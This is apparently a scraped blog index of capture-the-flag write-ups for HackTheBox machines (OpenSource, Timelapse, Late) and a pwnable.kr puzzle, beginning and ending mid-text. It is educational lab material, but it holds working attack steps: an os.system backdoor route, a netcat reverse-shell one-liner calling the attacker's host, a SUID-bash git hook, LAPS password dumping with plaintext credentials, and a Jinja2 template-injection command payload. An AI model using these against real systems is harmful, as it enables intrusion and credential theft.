\"http://www.w3.org/TR/html4/strict.dtd\"\u003e | \u003chtml\u003e | \u003chead\u003e | \u003cmeta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"\u003e | \u003ctitle\u003eError response\u003c/title\u003e | \u003c/head\u003e | \u003cbody\u003e | \u003ch1\u003eError response\u003c/h1\u003e | \u003cp\u003eError code: 400\u003c/p\u003e | \u003cp\u003eMessage: Bad request version ('RTSP/1.0').\u003c/p\u003e | \u003cp\u003eError code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.\u003c/p\u003e | \u003c/body\u003e |_ \u003c/html\u003e |_http-title: upcloud - Upload files for Free! | http-methods: |_ Supported Methods: GET OPTIONS HEAD |_http-server-header: Werkzeug/2.1.2 Python/3.10.3 3000/tcp filtered ppp no-response Starting with port 80 we have a website. Website\rScrolling further down, we have a download option to download the source code of the web. Downloading the source code\rBelow the Download button, there’s also a Take me there! button which opens up a file upload page. Take me there button\rFile Upload Page\rTesting out the functionality, we can upload a file and then it provides us with the link to download that file. Since we got the source code, let’s review it now. ","date":"2022-10-05","objectID":"/hackthebox-opensource/:2:0","tags":["hackthebox","machines"],"title":"HackTheBox - OpenSource","uri":"/hackthebox-opensource/"},{"categories":["HackTheBox"],"content":"Analyzing the Source Code From here, there are two paths to get the foothold on the machine. The first is to exploit the werkzeug debug console by cracking the pin. We can crack the pin by taking advantage of the LFI vulnerability in the source code. But sadly I couldn’t get the console even though I cracked the PIN. I heard others cracked it and got access to the console, so looking forward to reading those writeups. The other method is to overwrite the views.py file again by taking advantage of the LFI. Cracking the PIN Since the werkzeug debug console is enabled on the website at http://opensource.htb/console. werkzeug debug console\rWe can take advantage of this exploit to crack the PIN. You can also watch John Hammond’s detailed video on this exploit referred to me by @ARZ. For the exploit to work we need the following mentioned values from the server. Exploit Values\rHow will we get these values? Through LFI. Looking at the views.py file, there’s a route defined to get the uploaded files from the server which uses the path.join function. uploaded files route\rGoing through this article, when we provide an absolute path starting with / the os.path.join behaves differently as shown below. path.join\rSource: https://blog.0xgodson.me/2022-04-09-path-traversal-via-join/ We can see on the utils.py file that it is removing the ../. Upload Filtering\rWe can fuzz the payloads to bypass this filtering and read files from the server. ┌──(saad👻ssaadakhtarr)-[~/…/hackthebox/hackthebox/machines/opensource] └─$ wfuzz -c -w LFI\\ payloads.txt -u http://opensource.htb/uploads/FUZZ -t 100 --hc 404,500,308 Fuzzing for LFI\rNow we can use any of the working payloads to read files from the server. /etc/passwd\rNow to crack the pin, we have the following values. root would be the username since I didn’t find any other user with /bin/bash in /etc/passwd file. flask.app as modname. Flask as getattr(app, '__name__', getattr(app.__class__, '__name__')). /usr/local/lib/python3.10/site-packages/flask/app.py as getattr(mod, '__file__', None) 2485377892356 as the decimal representation of /sys/class/net/eth0/address d6934f3e-794c-4e48-b2f4-06bca8ac8cb153e9b96ec5190b54bcca63e76dc04e7507afdfd2805a64b64027aa3c8ed42d3f as proc/sys/kernel/random/boot_id + /proc/self/cgroup Even though I read all these values from the server the exploited PIN still wasn’t working for some reason so I couldn’t go further than this. Moving on. Manipulating the views.py Looking around, there’s some filtering applied to our uploaded file path in /app/app/utils.py file. Upload Filtering\rIt removes ../ if we provide any. There’s also a /app/app/views.py file which is defining the routes. Looking at the views.py file there is the usage of os.path.join. Vulnerable function\r","date":"2022-10-05","objectID":"/hackthebox-opensource/:2:1","tags":["hackthebox","machines"],"title":"HackTheBox - OpenSource","uri":"/hackthebox-opensource/"},{"categories":["HackTheBox"],"content":"Foothold How we will abuse this functionality is we can try overwriting this views.py file on the server and add another route leading to command execution. We change the views.py file as follows. import os from app.utils import get_file_name from flask import render_template, request, send_file from app import app @app.route('/') def index(): return render_template('index.html') @app.route('/download') def download(): return send_file(os.path.join(os.getcwd(), \"app\", \"static\", \"source.zip\")) @app.route('/upcloud', methods=['GET', 'POST']) def upload_file(): if request.method == 'POST': f = request.files['file'] file_name = get_file_name(f.filename) file_path = os.path.join(os.getcwd(), \"public\", \"uploads\", file_name) f.save(file_path) return render_template('success.html', file_url=request.host_url + \"uploads/\" + file_name) return render_template('upload.html') @app.route('/uploads/\u003cpath:path\u003e') def send_report(path): path = get_file_name(path) return send_file(os.path.join(os.getcwd(), \"public\", \"uploads\", path)) @app.route('/shell') def rev_shell(): return os.system(request.args.get('cmd')) And now on /upload endpoint we upload our views.py file and manipulate the request as follows. Overwriting the views.py\rNow we start a netcat listener and browse the /shell endpoint with a reverse shell payload. ┌──(saad👻ssaadakhtarr)-[~/…/machines/opensource/app/app] └─$ curl 'http://10.10.11.164/shell?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202\u003e%261|nc%2010.10.14.55%204444%20\u003e/tmp/f' And we got the foothold. ┌──(saad👻ssaadakhtarr)-[~/…/machines/opensource/app/app] └─$ nc -lvnp 4444 listening on [any] 4444 ... connect to [10.10.14.55] from (UNKNOWN) [10.10.11.164] 39869 /bin/sh: can't access tty; job control turned off /app # whoami root /app # We are inside a docker container as root. ","date":"2022-10-05","objectID":"/hackthebox-opensource/:3:0","tags":["hackthebox","machines"],"title":"HackTheBox - OpenSource","uri":"/hackthebox-opensource/"},{"categories":["HackTheBox"],"content":"Analyzing the internal network Looking at the ip of our target machine we are part of 172.17.0.1 network. ip address\rListing the currently running services. netstat\rFrom our initial nmap scan, we saw port 3000 as filtered. Since there isn’t any service running here on port 3000 we can conclude that’s a different instance. What we can do now is we can check for port 3000 on other ip addresses on our network. For that I uploaded a static nmap binary on the server using the /upload functionality. Upon manually checking the ip addresses, 172.17.0.1 has an open port 3000. nmap scan\r","date":"2022-10-05","objectID":"/hackthebox-opensource/:3:1","tags":["hackthebox","machines"],"title":"HackTheBox - OpenSource","uri":"/hackthebox-opensource/"},{"categories":["HackTheBox"],"content":"Exposing the Internal Port We’ll now use chisel to forward this port and access on our machine. On our local machine ┌──(saad👻ssaadakhtarr)-[~/…/machines/opensource/app/app] └─$ ./chisel server --reverse --port 8000 On target machine /app/public/uploads # ./chisel client 10.10.14.50:8000 R:3000:172.17.0.1:3000 Now visiting http://localhost:300/ on our machine will open up the website. Website on port 3000\rIt’s a simple website but we need credentials to login to escalate further. ","date":"2022-10-05","objectID":"/hackthebox-opensource/:3:2","tags":["hackthebox","machines"],"title":"HackTheBox - OpenSource","uri":"/hackthebox-opensource/"},{"categories":["HackTheBox"],"content":"Finding the leaked credentials If we analyze the .git repo in the source code, in a previous commit there are some credentials. git log dev\rgit show\rcredentials\rNow we log in with those credentials. dev01 dashboard\r","date":"2022-10-05","objectID":"/hackthebox-opensource/:3:3","tags":["hackthebox","machines"],"title":"HackTheBox - OpenSource","uri":"/hackthebox-opensource/"},{"categories":["HackTheBox"],"content":"Reading the private SSH key Looking around there’s a repo home_backup in which there is a ssh key. dev01/home_backup repo\r.ssh folder\rTrying this key to login as dev01 through ssh. ┌──(saad👻ssaadakhtarr)-[~/…/hackthebox/hackthebox/machines/opensource] └─$ ssh -i id_rsa dev01@opensource.htb dev01@opensource:~$ whoami dev01 dev01@opensource:~$ And we’re in! ","date":"2022-10-05","objectID":"/hackthebox-opensource/:3:4","tags":["hackthebox","machines"],"title":"HackTheBox - OpenSource","uri":"/hackthebox-opensource/"},{"categories":["HackTheBox"],"content":"user.txt dev01@opensource:~$ ls -al total 44 drwxr-xr-x 7 dev01 dev01 4096 May 16 12:51 . drwxr-xr-x 4 root root 4096 May 16 12:51 .. lrwxrwxrwx 1 dev01 dev01 9 Mar 23 2022 .bash_history -\u003e /dev/null -rw-r--r-- 1 dev01 dev01 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 dev01 dev01 3771 Apr 4 2018 .bashrc drwx------ 2 dev01 dev01 4096 May 4 16:35 .cache drwxrwxr-x 8 dev01 dev01 4096 Oct 6 11:09 .git drwx------ 3 dev01 dev01 4096 May 4 16:35 .gnupg drwxrwxr-x 3 dev01 dev01 4096 May 4 16:35 .local -rw-r--r-- 1 dev01 dev01 807 Apr 4 2018 .profile drwxr-xr-x 2 dev01 dev01 4096 May 4 16:35 .ssh -rw-r----- 1 root dev01 33 Oct 6 11:04 user.txt dev01@opensource:~$ cat user.txt 89****************************97 dev01@opensource:~$ ","date":"2022-10-05","objectID":"/hackthebox-opensource/:3:5","tags":["hackthebox","machines"],"title":"HackTheBox - OpenSource","uri":"/hackthebox-opensource/"},{"categories":["HackTheBox"],"content":"Privilege Escalation ","date":"2022-10-05","objectID":"/hackthebox-opensource/:4:0","tags":["hackthebox","machines"],"title":"HackTheBox - OpenSource","uri":"/hackthebox-opensource/"},{"categories":["HackTheBox"],"content":"Analyzing the processes Analyzing the processes with pspy, there are some git commands that are being executed by root user. git commands running as root\rWe can take advantage of git hooks and add a crafted payload in one of the hooks to escalate to root. ","date":"2022-10-05","objectID":"/hackthebox-opensource/:4:1","tags":["hackthebox","machines"],"title":"HackTheBox - OpenSource","uri":"/hackthebox-opensource/"},{"categories":["HackTheBox"],"content":"Understading the git hooks Git Hooks\rGit hooks are shell scripts found in the hidden . git/hooks directory of a Git repository. These scripts trigger actions in response to specific events, so they can help you automate your development lifecycle.\rOut of the git hooks there’s one called pre-commit that lets you execute code before a commit. pre-commit\rThe pre-commit hook is run first, before you even type in a commit message. It’s used to inspect the snapshot that’s about to be committed, to see if you’ve forgotten something, to make sure tests run, or to examine whatever you need to inspect in the code.\r","date":"2022-10-05","objectID":"/hackthebox-opensource/:4:2","tags":["hackthebox","machines"],"title":"HackTheBox - OpenSource","uri":"/hackthebox-opensource/"},{"categories":["HackTheBox"],"content":"Exploitation We will add a pre-commit hook in ~/.git/hooks folder and set the SUID bit for bash in it. dev01@opensource:~$ echo \"chmod u+s /bin/bash\" \u003e\u003e ~/.git/hooks/pre-commit dev01@opensource:~$ chmod +x ~/.git/hooks/pre-commit dev01@opensource:~$ ls -al /bin/bash -rwsr-xr-x 1 root root 1113504 Apr 18 15:08 /bin/bash dev01@opensource:~$ bash -p bash-4.4# whoami root bash-4.4# ","date":"2022-10-05","objectID":"/hackthebox-opensource/:4:3","tags":["hackthebox","machines"],"title":"HackTheBox - OpenSource","uri":"/hackthebox-opensource/"},{"categories":["HackTheBox"],"content":"root.txt bash-4.4# ls -al total 68 drwx------ 9 root root 4096 May 20 09:32 . drwxr-xr-x 24 root root 4096 May 4 16:35 .. lrwxrwxrwx 1 root root 9 Mar 23 2022 .bash_history -\u003e /dev/null -rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrc drwx------ 2 root root 4096 May 4 16:35 .cache -rw-rw-r-- 1 dev01 dev01 269 May 2 23:43 config drwx------ 3 root root 4096 May 4 16:35 .config -rw-r--r-- 1 root root 107 Apr 21 15:38 .gitconfig -rw------- 1 root root 61 May 16 12:51 .git-credentials drwx------ 3 root root 4096 May 4 16:35 .gnupg drwxr-xr-x 3 root root 4096 May 4 16:35 .local drwxr-xr-x 4 root root 4096 May 20 12:38 meta -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rw-r----- 1 root root 33 Oct 6 11:37 root.txt -rw-r--r-- 1 root root 66 May 20 09:32 .selected_editor drwx------ 3 root root 4096 May 4 16:35 snap drwx------ 2 root root 4096 May 4 16:35 .ssh -rw-r--r-- 1 root root 165 Apr 27 20:21 .wget-hsts bash-4.4# cat root.txt 4f****************************72 bash-4.4# Thanks for reading! ","date":"2022-10-05","objectID":"/hackthebox-opensource/:4:4","tags":["hackthebox","machines"],"title":"HackTheBox - OpenSource","uri":"/hackthebox-opensource/"},{"categories":["HackTheBox"],"content":"HackTheBox easy machine Timelapse walkthrough \u0026 tutorial..","date":"2022-08-20","objectID":"/hackthebox-timelapse/","tags":["hackthebox","machines"],"title":"HackTheBox - Timelapse","uri":"/hackthebox-timelapse/"},{"categories":["HackTheBox"],"content":"This post is focused on the walkthrough of Easy Machine Timelapse from HackTheBox. ","date":"2022-08-20","objectID":"/hackthebox-timelapse/:0:0","tags":["hackthebox","machines"],"title":"HackTheBox - Timelapse","uri":"/hackthebox-timelapse/"},{"categories":["HackTheBox"],"content":"Enumeration Starting out with the initial nmap scan. ┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup] └─$ nmap -A -vv -Pn 10.10.11.152 -oN nmapN PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack Simple DNS Plus 88/tcp open kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2022-08-18 16:40:28Z) 135/tcp open msrpc syn-ack Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack 464/tcp open kpasswd5? syn-ack 593/tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? syn-ack Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 8h00m03s | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 64147/tcp): CLEAN (Timeout) | Check 2 (port 32357/tcp): CLEAN (Timeout) | Check 3 (port 16288/udp): CLEAN (Timeout) | Check 4 (port 22941/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-time: | date: 2022-08-18T16:40:37 |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required Enumerating smb we found some shares listed. ┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup] └─$ smbclient -L 10.10.11.152 Password for [WORKGROUP\\saad]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Shares Disk SYSVOL Disk Logon server share Looking at the Shares share we have two directories Dev and HelpDesk smbclient \\\\\\\\10.10.11.152\\\\Shares Password for [WORKGROUP\\saad]: Try \"help\" to get a list of possible commands. smb: \\\u003e ls . D 0 Mon Oct 25 11:39:15 2021 .. D 0 Mon Oct 25 11:39:15 2021 Dev D 0 Mon Oct 25 15:40:06 2021 HelpDesk D 0 Mon Oct 25 11:48:42 2021 The HelpDesk directory has some files related to LAPS. But nothing seems useful for now. smb: \\HelpDesk\\\u003e ls . D 0 Mon Oct 25 11:48:42 2021 .. D 0 Mon Oct 25 11:48:42 2021 LAPS.x64.msi A 1118208 Mon Oct 25 10:57:50 2021 LAPS_Datasheet.docx A 104422 Mon Oct 25 10:57:46 2021 LAPS_OperationsGuide.docx A 641378 Mon Oct 25 10:57:40 2021 LAPS_TechnicalSpecification.docx A 72683 Mon Oct 25 10:57:44 2021 The Dev directory has a file winrm_backup.zip which we can analyze. smb: \\Dev\\\u003e ls . D 0 Mon Oct 25 15:40:06 2021 .. D 0 Mon Oct 25 15:40:06 2021 winrm_backup.zip A 2611 Mon Oct 25 11:46:42 2021 ","date":"2022-08-20","objectID":"/hackthebox-timelapse/:1:0","tags":["hackthebox","machines"],"title":"HackTheBox - Timelapse","uri":"/hackthebox-timelapse/"},{"categories":["HackTheBox"],"content":"Foothold The zip file is password protected which we can crack using john. ┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup] └─$ zip2john winrm_backup.zip \u003e john.hash ┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup] └─$ john --wordlist=/home/saad/Documents/wordlists/rockyou.txt john.hash Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status supremelegacy (winrm_backup.zip/legacyy_dev_auth.pfx) 1g 0:00:00:01 DONE (2022-08-18 04:50) 0.6535g/s 2267Kp/s 2267Kc/s 2267KC/s surkerior..suppamas Use the \"--show\" option to display all of the cracked passwords reliably Session completed. Extracting the zip we get a legacyy_dev_auth.pfx file. Looking for the .pfx files. .pfx files\rThe .pfx file, which is in a PKCS#12 format, contains the SSL certificate (public keys) and the corresponding private keys.\rSource: https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file Before extracting the certificate, we need to crack the password of .pfx file. We’ll do this using john as well. ┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup] └─$ pfx2john legacyy_dev_auth.pfx \u003e pfx.hash ┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup] └─$ john --wordlist=/home/saad/Documents/wordlists/rockyou.txt pfx.hash Using default input encoding: UTF-8 Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x]) Cost 1 (iteration count) is 2000 for all loaded hashes Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status thuglegacy (legacyy_dev_auth.pfx) 1g 0:00:04:12 DONE (2022-08-18 05:08) 0.003963g/s 12808p/s 12808c/s 12808C/s thuglife06..thug211 Use the \"--show\" option to display all of the cracked passwords reliably Session completed. Now we’ll follow the instructions here to extract the certificate and private key from the .pfx file. ┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup] └─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy.crt Enter Import Password:thuglegacy ┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup] └─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy.key Enter Import Password:thuglegacy Enter PEM pass phrase:thuglegacy Verifying - Enter PEM pass phrase:thuglegacy ","date":"2022-08-20","objectID":"/hackthebox-timelapse/:2:0","tags":["hackthebox","machines"],"title":"HackTheBox - Timelapse","uri":"/hackthebox-timelapse/"},{"categories":["HackTheBox"],"content":"user.txt Now we’ll use evil-winrm to login with the certificate and key. ┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup] └─$ evil-winrm -i 10.10.11.152 -c legacyy.crt -k legacyy.key -S Evil-WinRM shell v3.3 Enter PEM pass phrase:thuglegacy *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u003e whoami timelapse\\legacyy *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u003e cd ../Desktop *Evil-WinRM* PS C:\\Users\\legacyy\\Desktop\u003e cat user.txt a******************************8 *Evil-WinRM* PS C:\\Users\\legacyy\\Desktop\u003e ","date":"2022-08-20","objectID":"/hackthebox-timelapse/:3:0","tags":["hackthebox","machines"],"title":"HackTheBox - Timelapse","uri":"/hackthebox-timelapse/"},{"categories":["HackTheBox"],"content":"Lateral Movement Analyzing the winPEAS output we found something interesting. ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Windows Files Files (limit 70) C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt C:\\Users\\Default\\NTUSER.DAT C:\\Users\\legacyy\\NTUSER.DAT Reading the ConsoleHost_history.txt file. whoami ipconfig /all netstat -ano |select-string LIST $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p) invoke-command -computername localhost -credential $c -port 5986 -usessl - SessionOption $so -scriptblock {whoami} get-aduser -filter * -properties * exit We got credentials of another user svc_deploy. Logging into svc_deploy. ┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup] └─$ evil-winrm -S -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' Evil-WinRM shell v3.3 *Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents\u003e whoami timelapse\\svc_deploy *Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents\u003e whoami /all USER INFORMATION ---------------- User Name SID ==================== ============================================ timelapse\\svc_deploy S-1-5-21-671920749-559770252-3318990721-3103 GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============================================ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group TIMELAPSE\\LAPS_Readers Group S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Plus Mandatory Level Label S-1-16-8448 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled USER CLAIMS INFORMATION ----------------------- User claims unknown. Kerberos support for Dynamic Access Control on this device has been disabled. *Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents\u003e Notice that this user is part of TIMELAPSE\\LAPS_Readers group. ","date":"2022-08-20","objectID":"/hackthebox-timelapse/:4:0","tags":["hackthebox","machines"],"title":"HackTheBox - Timelapse","uri":"/hackthebox-timelapse/"},{"categories":["HackTheBox"],"content":"Privilege Escalation Looking for privilege escalation using LAPS. LAPS\rLAPS simplifies password management while helping customers implement recommended defenses against cyberattacks. In particular, the solution mitigates the risk of lateral escalation that results when customers use the same administrative local account and password combination on their computers. LAPS stores the password for each computer’s local administrator account in Active Directory, secured in a confidential attribute in the computer’s corresponding Active Directory object.\rSource: https://www.hackingarticles.in/credential-dumpinglaps/ Looking further on the same article, there are a bunch of methods to dump Administrator password. I used crackmapexec to dump the Administrator password. ┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup] └─$ crackmapexec ldap 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' –kdcHost 10.10.11.152 -M laps SMB 10.10.11.152 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False) LDAP 10.10.11.152 389 DC01 [+] timelapse.htb\\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV LAPS 10.10.11.152 389 DC01 [*] Getting LAPS Passwords LAPS 10.10.11.152 389 DC01 Computer: DC01$ Password: 8qRr)lFd9+fHLk47l(N.v%tj Now login to Administrator using evil-winrm. ┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup] └─$ evil-winrm -S -i 10.10.11.152 -u Administrator -p '8qRr)lFd9+fHLk47l(N.v%tj' Evil-WinRM shell v3.3 *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e whoami timelapse\\administrator ","date":"2022-08-20","objectID":"/hackthebox-timelapse/:5:0","tags":["hackthebox","machines"],"title":"HackTheBox - Timelapse","uri":"/hackthebox-timelapse/"},{"categories":["HackTheBox"],"content":"root.txt Usually the root.txt is located at C:\\Users\\Administrator\\Desktop\\ for windows machines but for this machine it is located at C:\\Users\\TRX\\Desktop. *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e Get-ChildItem -Path C:\\ -Filter root.txt -Recurse -ErrorAction SilentlyContinue -Force Directory: C:\\Users\\TRX\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 8/18/2022 8:29 AM 34 root.txt *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e cat C:\\Users\\TRX\\Desktop\\root.txt e******************************4 *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e Thanks for reading! ","date":"2022-08-20","objectID":"/hackthebox-timelapse/:6:0","tags":["hackthebox","machines"],"title":"HackTheBox - Timelapse","uri":"/hackthebox-timelapse/"},{"categories":["Pwnable.kr"],"content":"Pwnable.kr Toddler's Battle challenge coin1 writeup.","date":"2022-08-18","objectID":"/pwnable.kr-toddlers-bottle-coin1/","tags":["pwn","binary exploitation"],"title":"Pwnable.kr - Toddler's Battle - [coin1]","uri":"/pwnable.kr-toddlers-bottle-coin1/"},{"categories":["Pwnable.kr"],"content":"Description This post will focus on an easy pwn challenge coin1 from Toddler’s Bottle series of pwnable.kr. Starting off we have the following description. Description\rConnecting with nc we get the following description of the game. --------------------------------------------------- - Shall we play a game? - --------------------------------------------------- You have given some gold coins in your hand however, there is one counterfeit coin among them counterfeit coin looks exactly same as real coin however, its weight is different from real one real coin weighs 10, counterfeit coin weighes 9 help me to find the counterfeit coin with a scale if you find 100 counterfeit coins, you will get reward :) FYI, you have 60 seconds. - How to play - 1. you get a number of coins (N) and number of chances (C) 2. then you specify a set of index numbers of coins to be weighed 3. you get the weight information 4. 2~3 repeats C time, then you give the answer - Example - [Server] N=4 C=2 # find counterfeit among 4 coins with 2 trial [Client] 0 1 # weigh first and second coin [Server] 20 # scale result : 20 [Client] 3 # weigh fourth coin [Server] 10 # scale result : 10 [Client] 2 # counterfeit coin is third! [Server] Correct! - Ready? starting in 3 sec... - N=78 C=7 On each turn we are given a set of gold coins in which one is a counterfeit i.e. fake coin with less weight than the original. The server’s going to give us two values N and C. Here N refers to the number of coins we have and C refers to the number of tries we get to guess all the counterfeit coins. We can provide a list of indices and the server will return the sum of those coins. The real challenge here is that we need to guess the correct counterfeit coins 100 times in 60 seconds so we need an efficient way to find the counterfeit coins. Finding an item from a list efficiently? Binary Search will save the day! Binary Search\rIn computer science, binary search, also known as half-interval search, logarithmic search, or binary chop, is a search algorithm that finds the position of a target value within a sorted array. Binary search compares the target value to the middle element of the array.\rSource: https://en.wikipedia.org/wiki/Binary_search_algorithm A general algorithm of binary search is shown below. binarySearch(arr, x, low, high) repeat till low = high mid = (low + high)/2 if (x == arr[mid]) return mid else if (x \u003e arr[mid]) // x is on the right side low = mid + 1 else // x is on the left side high = mid - 1 Source: https://www.geeksforgeeks.org/binary-search/ Now since we need to do 100 correct guesses in 60 seconds we’ll write a python script to do it more efficiently. We can make a remote connection to the server and run our exploit but the connection will be slow and the task won’t be completed. So we can ssh into any of the previous challenges and run the script locally there. ","date":"2022-08-18","objectID":"/pwnable.kr-toddlers-bottle-coin1/:1:0","tags":["pwn","binary exploitation"],"title":"Pwnable.kr - Toddler's Battle - [coin1]","uri":"/pwnable.kr-toddlers-bottle-coin1/"},{"categories":["Pwnable.kr"],"content":"Exploitation from pwn import * conn = remote('localhost', 9007) # Establishing connection to the port 9007 locally for fast response conn.recvuntil('Ready? starting in 3 sec') conn.recvline() conn.recvline() for i in range(100): # Going over 100 iterations to cover all the questions. values = conn.recvline().decode('utf-8') N = int(values.split()[0][2:]) # Value of N for each iteration C = int(values.split()[1][2:]) # Value of C for each iteration start = 0 # Initial starting index for binary search end = N-1 # Initial ending index for binary search # Binary Search for i in range(C): mid = (start + end) // 2 new_list = \" \".join([str(i) for i in range(start,mid+1)]) # Create a list of indices to send to the server conn.sendline(new_list) # Sending the list to the server sum_result = int(conn.recvline().decode('utf-8').strip('\\n')) # Server's response of our indices list if (sum_result % 10 == 0): # If the sum is divisible by 10 then look for the other half of the list start = mid + 1 else: # Else look further in the current half of the list end = mid - 1 conn.sendline(str(start)) # Send the correct answer to the server print(conn.recvline()) # Print the flag print(conn.recvline()) print(conn.recvline()) Running the Exploit\rThanks for reading! ","date":"2022-08-18","objectID":"/pwnable.kr-toddlers-bottle-coin1/:2:0","tags":["pwn","binary exploitation"],"title":"Pwnable.kr - Toddler's Battle - [coin1]","uri":"/pwnable.kr-toddlers-bottle-coin1/"},{"categories":["HackTheBox"],"content":"Hackthebox easy machine late walkthrough \u0026 tutorial..","date":"2022-08-01","objectID":"/hackthebox-late/","tags":["hackthebox","machines"],"title":"Hackthebox - Late","uri":"/hackthebox-late/"},{"categories":["HackTheBox"],"content":"This post is focused on the walkthrough of Easy Machine Late from HackTheBox. ","date":"2022-08-01","objectID":"/hackthebox-late/:0:0","tags":["hackthebox","machines"],"title":"Hackthebox - Late","uri":"/hackthebox-late/"},{"categories":["HackTheBox"],"content":"Enumeration Starting out with the initial nmap scan. nmap -A -vv 10.10.11.156 -oN nmapN Nmap Scan\rWe have ports 22 and 80 is open. So let’s enumerate port 80 now. Website\rWe have a website here titled Late. Scrolling through the website I found a link pointing to images.late.htb. images.late.htb link\rLet’s add late.htb and images.late.htb in our /etc/hosts file. echo \"10.10.11.156 late.htb \" | sudo tee -a /etc/hosts echo \"10.10.11.156 images.late.htb \" | sudo tee -a /etc/hosts Visiting images.late.htb we have, images.late.htb page\rThe title says it converts image to text. Let’s try that out. I took a screenshot of a text and uploaded the file and it returned with the correct text. I uploaded, Test Screenshot\rIt returned, Test Output\rSince the title of the page says it converts image to text with flask. I started trying most common vulnerability of flask Server Side Template Injection (SSTI). I uploaded the following payload. Test Payload\rAnd it returned 49. This confirmed the SSTI. I further enumerated to confirm the template engine and it turned out to be Jinja2. ","date":"2022-08-01","objectID":"/hackthebox-late/:1:0","tags":["hackthebox","machines"],"title":"Hackthebox - Late","uri":"/hackthebox-late/"},{"categories":["HackTheBox"],"content":"Gaining Access For command injection, I injected the following payload from PayloadAllTheThings. {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }} And got the following output. Test Output\rBoom! Our command successfully got injected. Let’s grab the 